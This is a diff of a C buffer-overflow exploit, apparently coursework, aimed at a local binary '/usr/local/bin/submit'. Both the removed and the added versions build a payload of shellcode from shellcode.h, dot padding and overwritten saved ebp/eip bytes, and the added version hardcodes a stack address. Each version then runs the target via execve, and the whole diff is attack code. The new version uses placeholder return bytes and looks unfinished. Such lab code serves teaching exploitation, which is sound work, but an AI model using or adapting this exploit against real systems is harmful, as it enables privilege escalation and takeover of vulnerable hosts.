@@ -10,42 +10,45 @@
 #include "shellcode.h"
 
 #define TARGET "/usr/local/bin/submit" // or submitV2
-#define FILE_NAME "file.txt"
 
-int main() {
+
+int main(void) {
     FILE *fp;
-	char *args[4];
 	char *env[1];
-    unsigned char argbuf[4017]; // 1024 for buffer, 4 for ebp, 4 for eip
-    unsigned char mod[] = "\xa8\x0f\x00\x00\xa4\x0f\x00\x00\x98\xde\xbf\xff\xa4\xd0\xbf\xff";
-
-    size_t i, len;
-    char *ptr;
+    char *argv[4];
+    char argbuf[2009]; // 300 for buffer, 4 for ebp, 4 for eip
+    long buf_addr = 0xffbfdc70;
+    int i, len;
 
     // create the argbuf
-    memset(argbuf, '.', sizeof(unsigned char)*4016);
+    strcpy(argbuf, shellcode);
+    // fill the argbuf with dot
+    len = strlen(argbuf);
 
-    ptr = argbuf + 984;
-    memcpy(ptr, shellcode, strlen(shellcode));
+    for(i = len; i < 2000; i++){
+        argbuf[i] = '.';
+    }
 
-    ptr = argbuf + 4000;
-    memcpy(ptr, mod, 16);
+    strcpy(argbuf+500, "\x01\x02\x03\x04\x05\x06\x07\x08");
 
-    fp = fopen("file.txt", "wb");
-    fwrite(argbuf, 1, sizeof(argbuf), fp);
-    fclose(fp);
+    
+    // get the buffer location using gdb
+    //long buffer_addr = 0xffbfdb68;
+	// one way to invoke submit
+	//system(TARGET "\"Hello world!\"");
 
-	args[0] = TARGET;
-	args[1] = "file.txt"; 
-    args[2] = NULL;
-    args[3] = NULL;
+	// another way
+	argv[0] = argbuf;
+	argv[1] = "-v"; 
+    argv[2] = NULL;
+    argv[3] = NULL;
 
 	env[0] = NULL;
 
-	if(execve(TARGET, args, env) < 0){
-        fprintf(stderr, "execve failed\n");
-    }
-
+	execve(TARGET, argv, env);
+    fprintf(stderr, "execve failed\n");
+    
+	// execve only returns if it fails
 	
 	return 1;
 }
